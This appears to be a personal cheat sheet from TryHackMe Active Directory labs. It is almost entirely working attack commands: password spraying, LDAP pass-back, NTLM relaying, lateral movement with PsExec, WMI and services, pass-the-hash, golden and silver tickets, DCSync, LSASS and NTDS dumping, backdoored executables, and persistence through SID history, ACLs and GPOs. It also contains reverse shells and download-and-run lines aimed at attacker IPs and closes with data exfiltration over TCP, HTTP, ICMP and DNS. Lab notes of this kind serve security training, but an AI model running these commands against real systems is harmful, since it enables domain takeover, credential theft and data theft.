# Enumeration

# Credential Injection

runas.exe /netonly /user:<domain>\<username> cmd.exe


# enumeration users
users
net user /domain

groups
net group /domain

# Password Policy
net accounts /domain

# bloodhound
SSharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
sudo neo4j console 
bloodhound --no-sandbox

https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html








# NTLM Authenticated Services
python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/


# LDAP Bind Credentials

[+] LDAP Pass-back Attacks

* hosting rogue ldap
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd

downgrade auth 

olcSaslSecProps.ldif 
         
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred

    olcSaslSecProps: Specifies the SASL security properties
    noanonymous: Disables mechanisms that support anonymous login
    minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.


sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN


sudo tcpdump -SX -i breachad tcp port 389


# Authentication Relays 


sudo responder -I breachad
hashcat -m 5600 <hash file> <password file> --force

# PXE
powerpxe
"\Tmp\x64{39...28}.bcd" conf.bcd

Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
Get-FindCredentials -WimFile pxeboot.wim





# lateral movement and pivoting

# Spawning Processes Remotely 

Psexec (port 445)
Required Group Memberships: Administrators

PsExec64.exe \\10.200.75.101 -u Administrator -p Mypass123 -i cmd.exe    


Winrm (5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS))
Required Group Memberships: Remote Management Users

winrs.exe -u:Administrator -p:Mypass123 -r:target cmd

using powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
Enter-PSSession -Computername TARGET -Credential $credential
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}


Remotely Creating Services Using sc

    Ports:
        135/TCP, 49152-65535/TCP (DCE/RPC)
        445/TCP (RPC over SMB Named Pipes)
        139/TCP (RPC over SMB Named Pipes)
    Required Group Memberships: Administrators


create service
sc.exe \\TARGET create THMservice binPath= "net user t1_leonard.summers  Pass123" start= auto
sc.exe \\TARGET start THMservice


remove service
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe

smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever

overcome new token generate when runas 
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.67.155 4443"


run rev shell using powershell
sc.exe \\thmiis.za.tryhackme.com create THMservice-3243 binPath= "cmd.exe /c powershell -ep bypass iex(New-Object Net.Webclient).DownloadString('http://10.50.67.155/Invoke-PowerShellTcp.ps1')" start= auto

sc.exe \\thmiis.za.tryhackme.com start THMservice-3243



# Creating Scheduled Tasks Remotely

schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
schtasks /s TARGET /run /TN "THMtask1" 
schtasks /S TARGET /TN "THMtask1" /DELETE /F



# Moving Laterally Using WMI 

WMI session using either of the following protocols:

    DCOM: RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
    Wsman: WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).


```
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop

```

Remote Process Creation Using WMI



    Ports:
        135/TCP, 49152-65535/TCP (DCERPC)
        5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
    Required Group Memberships: Administrators


$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}

wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 


Creating Services Remotely with WMI


    Ports:
        135/TCP, 49152-65535/TCP (DCERPC)
        5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
    Required Group Memberships: Administrators




Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}

And then, we can get a handle on the service and start it with the following commands:

$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService

Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete



Creating Scheduled Tasks Remotely with WMI


    Ports:
        135/TCP, 49152-65535/TCP (DCERPC)
        5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
    Required Group Memberships: Administrators



# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"




Installing MSI packages through WMI


    Ports:
        135/TCP, 49152-65535/TCP (DCERPC)
        5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
    Required Group Memberships: Administrators


Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}

wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi




# Use of Alternate Authentication Material 

Extracting NTLM hashes from local SAM
privilege::debug
token::elevate
lsadump::sam 

Extracting NTLM hashes from LSASS memory

privilege::debug
token::elevate
sekurlsa::msv

pass the hash
token::revert
sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"

Connect to RDP using PtH
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH

Connect via psexec using PtH
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP

Connect to WinRM using PtH
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH


Pass-the-Ticket

privilege::debug
sekurlsa::tickets /export
kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi


Overpass-the-hash / Pass-the-Key

privilege::debug
sekurlsa::ekeys
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"



# Abusing User Behaviour 

Backdooring .vbs Scripts

CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True

Backdooring .exe Files

msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe

RDP hijacking

close rdp session without logout.


query users
query user
session with a Disc state has been left open 
run cmd as Administrator
PsExec64.exe -s cmd.exe

tscon 3 /dest:rdp-tcp#6



# Port Forwarding 

SSH Tunnelling

ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80


ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7777:127.0.0.1:7777 -N

Port Forwarding With socat
socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389



Dynamic Port Forwarding and SOCKS

ssh tunneluser@1.1.1.1 -R 9050 -N




# Exploiting Permission Delegation 


    ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
    AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
    GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
    GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
    WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
    WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
    AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.



 Add-ADGroupMember "IT Support" -Members "sharon.khan"
 Get-ADGroupMember -Identity "IT Support"

 ForceChangePassword
 Get-ADGroupMember -Identity "Tier 2 Admins"

change password
 $Password = ConvertTo-SecureString "P@ssw0rd1337" -AsPlainText -Force 
 Set-ADAccountPassword -Identity "t2_melanie.davies" -Reset -NewPassword $Password 
 force update
gpupdate /force



# Exploiting Kerberos Delegation 

TRUSTED_FOR_DELEGATION flag

msDS-AllowedToActOnBehalfOfOtherIdentity

Import-Module C:\Tools\PowerView.ps1 
Get-NetUser -TrustedToAuth


mimikatz
token::elevate
lsadump::secrets


kekeo.exe

generate tgt 
tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@

tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
user - The user we want to impersonate. 
command generate tgt 

use mimikatz to inject tickets
privilege::debug
kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

interact with server
New-PSSession -ComputerName thmserver1.za.tryhackme.loc
 Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc


 # Exploiting Automated Relays 
 identify  machine account has administrative access over another machine

bloodhound query
 MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p


The Printer Bug

Print Spooler Service
use wmi query
GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc

SMB Signing

nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc


Exploiting Authentication Relays

https://github.com/leechristensen/SpoolSample


step ntlm Relay


impacket-ntlmrelayx -smb2support -t  smb://10.200.60.201 -c 'whoami /all' -debug


impacket-ntlmrelayx -smb2support -t  smb://10.200.60.201 -c "cmd.exe /c powershell -ep bypass iex(New-Object Net.Webclient).DownloadString('http://10.50.67.155:81/Invoke-PowerShellTcp.ps1')" -debug

SpoolSample.exe THMSERVER2.za.tryhackme.loc 10.50.57.65 

look for file
Get-ChildItem -Recurse *.kdbx



# Exploiting Certificates 

Finding Vulnerable Certificate Templates
certutil -Template -v > templates.txt
https://github.com/GhostPack/PSPKIAudit

parameters
    Client Authentication - The certificate can be used for Client Authentication.
    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT - The certificate template allows us to specify the Subject Alternative Name (SAN).
    CTPRIVATEKEY_FLAG_EXPORTABLE_KEY - The certificate will be exportable with the private key.
    Certificate Permissions - We have the required permissions to use the certificate template.

    Click Start->run
    Type mmc and hit enter
    Click File->Add/Remove Snap-in..
    Add the Certificates snap-in and make sure to select Computer Account and Local computer on the prompts.
    Click OK


        Right Click on Personal and select All Tasks->Request New Certificate...
    Click Next twice to select the AD enrollment policy.
    You will see that we have one template that we can request, but first, we need to provide additional information.
    Click on the More Information warning.
    Change the Subject name Type option to Common Name and provide any value, since it does not matter, and click Add.
    Change the Alternative name Type option to User principal name.
    Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click Add.




        Right-click on the certificate and select All Tasks->Export...
    Click Next, select Yes, export the private key, and click Next.
    Click Next, then set a password for the certificate since the private key cannot be exported without a password.
    Click Next and select a location to store the certificate.
    Click Next and finally click Finish.





Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>


    /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
    /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
    /certificate - Path to the certificate we have generated
    /password - The password for our certificate file
    /outfile - The file where our TGT will be output to
    /domain - The FQDN of the domain we are currently attacking
    /dc - The IP of the domain controller which we are requesting the TGT from. Usually it is best to select a DC that has a CA service running



mimikatz
 privilege::debug
 kerberos::ptt administrator.kirbi


 create service
 sc.exe \\THMDC.za.tryhackme.loc create THMservice-3243 binPath= "cmd.exe /c powershell -ep bypass iex(New-Object Net.Webclient).DownloadString('http://10.50.57.65:81/Invoke-PowerShellTcp.ps1')" start= auto

sc.exe \\THMDC.za.tryhackme.loc start THMservice-3243



# Exploiting Domain Trusts 

dump krbtgt
privilege::debug
lsadump::dcsync /user:za\krbtgt

Inter-Realm TGTs
access resource on other domain

Mimikatz can assist with this, allowing us to set the ExtraSids section of the KERB_VALIDATION_INFO structure of the Kerberos TGT.


the ExtraSids section is described as “A pointer to a list of KERB_SID_AND_ATTRIBUTES structures that contain a list of SIDs corresponding to groups in domains other than the account domain to which the principal belongs”.


SID of the Enterprise Admins (EA) group as an extra SID 



two SIDs:

    The SID of the child domain controller (THMDC), which we will impersonate in our forged TGT

Get-ADComputer -Identity "THMDC"


    The SID of the Enterprise Admins in the parent domain, which we will add as an extra SID to our forged TGT 

Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc


Exploiting Domain Trusts

privilege::debug
kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt



sc.exe \\thmrootdc.tryhackme.loc create THMservice-3243 binPath= "cmd.exe /c powershell -ep bypass iex(New-Object Net.Webclient).DownloadString('http://10.50.57.65:81/Invoke-PowerShellTcp.ps1')" start= auto

sc.exe \\thmrootdc.tryhackme.loc  start THMservice-3243









############## Persisting Active Directory #########

we should attempt to persist through credentials such as the following:

Credentials that have local administrator rights on several machines. Usually, organisations have a group or two with local admin rights on almost all computers. These groups are typically divided into one for workstations and one for servers. By harvesting the credentials of members of these groups, we would still have access to most of the computers in the estate.
Service accounts that have delegation permissions. With these accounts, we would be able to force golden and silver tickets to perform Kerberos delegation attacks.
Accounts used for privileged AD services. If we compromise accounts of privileged services such as Exchange, Windows Server Update Services (WSUS), or System Center Configuration Manager (SCCM), we could leverage AD exploitation to once again gain a privileged foothold.


mimikatz 
 lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>
 lsadump::dcsync /domain:za.tryhackme.loc /all





 # Persistence through Tickets
get all parameters
Get-ADDomain

domain name
domain sid 
user id 


silver ticket
the generated TGS is signed by the machine account of the host we are targeting.


kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt

    /admin - The username we want to impersonate. This does not have to be a valid user.
    /domain - The FQDN of the domain we want to generate the ticket for.
    /id -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
    /sid -The SID of the domain we want to generate the ticket for.
    /target - The hostname of our target server. Let's do THMSERVER1.za.tryhackme.loc, but it can be any domain-joined host.
    /rc4 - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of THMSERVER1$. The $ indicates that it is a machine account.
    /service - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.
    /ptt - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.







golden ticket
kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt

/admin - The username we want to impersonate. This does not have to be a valid user.
/domain - The FQDN of the domain we want to generate the ticket for.
/id -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
/sid -The SID of the domain we want to generate the ticket for.
/krbtgt -The NTLM hash of the KRBTGT account.
/endin - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)
/renewmax -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
/ptt - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.





# Persistence through Certificates 


Extracting the Private Key

Active Directory Certificate Services (AD CS) for internal purposes, it is protected by the machine Data Protection API (DPAPI)

Mimikatz and SharpDPAPI 

mimikatz
view the certificates stored on the DC:

crypto::certificates /systemstore:local_machine

export keys

mimikatz
privilege::debug
crypto::capi
crypto::cng
crypto::certificates /systemstore:local_machine /export

note:
. In order to export the private key, a password must be used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz

Generating our own Certificates

https://github.com/GhostPack/ForgeCert

ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 

    CaCertPath - The path to our exported CA certificate.
    CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.
    Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
    SubjectAltName - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
    NewCertPath - The path to where ForgeCert will store the generated certificate.
    NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.


    generate tgt using certificate

    Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate: /password: /outfile: /domain:za.tryhackme.loc /dc:


    /user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
    /enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
    /certificate - Path to the certificate we have generated
    /password - The password for our certificate file
    /outfile - The file where our TGT will be output to
    /domain - The FQDN of the domain we are currently attacking
    /dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running




load ticket in memory using mimikatz
kerberos::ptt administrator.kirbi



# Persistence through SID History 

notes about this persistence technique:

    We normally require Domain Admin privileges or the equivalent thereof to perform this attack.
    When the account creates a logon event, the SIDs associated with the account are added to the user's token, which then determines the privileges associated with the account. This includes group SIDs.
    We can take this attack a step further if we inject the Enterprise Admin SID since this would elevate the account's privileges to effective be Domain Admin in all domains in the forest.
    Since the SIDs are added to the user's token, privileges would be respected even if the account is not a member of the actual group. Making this a very sneaky method of persistence. We have all the permissions we need to compromise the entire domain (perhaps the entire forest), but our account can simply be a normal user account with membership only to the Domain Users group. We can up the sneakiness to another level by always using this account to alter the SID history of another account, so the initial persistence vector is not as easily discovered and remedied.




Get-ADUser <your ad username> -properties sidhistory,memberof

Get-ADGroup "Domain Admins"
add group sid to user account

mimikatz can add sid history
https://github.com/MichaelGrafnetter/DSInternals

Stop-Service -Name ntds -force

Add-ADDBSidHistory -SamAccountName tony.wilson -SidHistory S-1-5-21-3885271727-2693558621-2658995185-512  -DatabasePath C:\Windows\NTDS\ntds.dit 

Start-Service -Name ntds  



# Persistence through Group Membership 

People->IT Organisational Unit (OU)

New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security

 People->Sales OU and add our previous group as a member:
New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security 

Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"

Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"



# Persistence through ACLs

Persisting through AD Group Templates
AdminSDHolder container  container exists in every AD domain, and its Access Control List (ACL) is used as a template to copy permissions to all protected groups. 

Domain Admins, Administrators, Enterprise Admins, and Schema Admins.

 process called SDProp takes the ACL of the AdminSDHolder container and applies it to all protected groups every 60 minutes


 runas /netonly /user:Administrator cmd.exe



Once you have an MMC window, add the Users and Groups Snap-in (File->Add Snap-In->Active Directory Users and Groups). Make sure to enable Advanced Features (View->Advanced Features). We can find the AdminSDHolder group under Domain->System:


Navigate to the Security of the group (Right-click->Properties->Security):

low-privileged user and grant Full Control:

    Click Add.
    Search for your low-privileged username and click Check Names.
    Click OK.
    Click Allow on Full Control.
    Click Apply.
    Click OK.


SDProp

Import-Module .\Invoke-ADSDPropagation.ps1 
Invoke-ADSDPropagation



# Persistence through GPOs 

Domain Wide Persistence

The following are some common GPO persistence techniques:

    Restricted Group Membership - This could allow us administrative access to all hosts in the domain
    Logon Script Deployment - This will ensure that we get a shell callback every time a user authenticates to a host in the domain. 


    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe
    runas /netonly /user:Administrator cmd.exe
    create admin.bat 
    copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe

    scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
    scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/


    
    GPO Creation

    The first step uses our Domain Admin account to open the Group Policy Management snap-in:

    In your runas-spawned terminal, type MMC and press enter.
    Click on File->Add/Remove Snap-in...
    Select the Group Policy Management snap-in and click Add
    Click OK



# Credential Access

powershell history
C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt


reg query HKLM /f password /t REG_SZ /s
eg query HKCU /f password /t REG_SZ /s

password on REG_SZ

password on description
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description


# Local Windows Credentials 

Volume Shadow Copy Service
steps

    Run the standard cmd.exe prompt with administrator privileges.

    Execute the wmic command to create a copy shadow of C: drive

    wmic shadowcopy call create Volume='C:\'

    Verify the creation from step 2 is available.

    vssadmin list shadows

    Copy the SAM database from the volume we created in step 2
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
    impacket-secretsdump   -sam sam -system system LOCAL


# Registry Hives

reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg


# Local Security Authority Subsystem Service (LSASS)

procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump

.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full


mimikatz Protected LSASS

In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. This task will show how to disable the LSA protection and dump credentials from memory using Mimikatz. To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa to 1.

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

0x00000005 error code message (Access Denied). Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows,

mimikatz # !+

Note: If this fails with an isFileExist error, exit mimikatz, navigate to C:\Tools\Mimikatz\ and run the command again.

mimikatz # !processprotect /process:lsass.exe /remove



# Credentials Manager

There are four credential categories:

    Web credentials contain authentication details stored in Internet browsers or other applications.
    Windows credentials contain Windows authentication details, such as NTLM or Kerberos.
    Generic credentials contain basic authentication details, such as clear-text usernames and passwords.
    Certificate-based credentials: Athunticated details based on certifications.



list available credentials 
vaultcmd /list

check if credentials exists
VaultCmd /listproperties:"Web Credentials"


Listing Credentials Details
VaultCmd /listcreds:"Web Credentials"


Credential Dumping
https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
powershell -ex bypass
Import-Module Get-WebCredentials.ps1
Get-WebCredentials

RunAs
cmdkey /list
runas /savecred /user:THM.red\thm-local cmd.exe

Mimikatz
privilege::debug
sekurlsa::credman


# NTDS Domain Controller

NTDS.DTS data consists of three tables as follows:

    Schema table: it contains types of objects and their relationships.
    Link table: it contains the object  attributes and their values.
    Data type: It contains users and groups.


in order to decrypt ntd.dts we must have system boot key to decrypt lsa isolated credential which store on SYSTEM file system


Ntdsutil
Ntdsutil Ntdsutil is a Windows utility to used manage and maintain Active Directory configurations

    Restore deleted objects in Active Directory.
    Perform maintenance for the AD database.
    Active Directory snapshot management.
    Set Directory Services Restore Mode (DSRM) administrator passwords.


Local Dumping (No Credentials)

dump following files 
    C:\Windows\NTDS\ntds.dit

    powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"


    C:\Windows\System32\config\SYSTEM
    C:\Windows\System32\config\SECURITY



impacket-secretsdump   -system SYSTEM -ntds ntds.dit local


Remote Dumping (With Credentials)
impacket-secretsdump   -just-dc THM.red/<AD_Admin_User>@10.10.253.212 
impacket-secretsdump  -just-dc-ntlm THM.red/<AD_Admin_User>@10.10.253.212


crack hash 
hashcat -m 1000 -a 0  /path/to/wordlist/such/as/rockyou.txt


# Local Administrator Password Solution (LAPS) 

Group Policy Preferences (GPP)

https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1


Local Administrator Password Solution (LAPS)

ms-mcs-AdmPwd : attribute contains a clear-text password of the local administrator
ms-mcs-AdmPwdExpirationTime : contains the expiration time to reset the password

LAPS uses admpwd.dll to change the local administrator password and update the value of ms-mcs-AdmPwd

Enumerate for LAPS

dir "C:\Program Files\LAPS\CSE"

Listing the available PowerShell cmdlets for LAPS 
Get-Command *AdmPwd*

Finding Users with AdmPwdExtendedRights Attribute 
Find-AdmPwdExtendedRights -Identity THMorg

Finding Users belong to THMGroupReader Group 
net groups "THMGroupReader"

Getting the Password
Get-AdmPwdPassword -ComputerName creds-harvestin




======================= dataxexfilt =========================


tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080

restoring data
dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar


[+] SSH 
tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"

[+] http 

<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>

curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php

sed -i 's/ /+/g' /tmp/http.bs64
cat /tmp/http.bs64 | base64 -d | tar xvfz -


[+] tunnling 
https://github.com/L-codes/Neo-reGeorg



[+] ICMP

use auxiliary/server/icmp_exfil
set BPF_FILTER icmp and not src ATTACKBOX_IP


reverse shell 
victim 
 icmpdoor -i eth0 -d 192.168.0.133
 attacker 
 icmp-cnc -i eth1 -d 192.168.0.121



 [+] DNS Exfiltration 
  cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/' 

  cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash
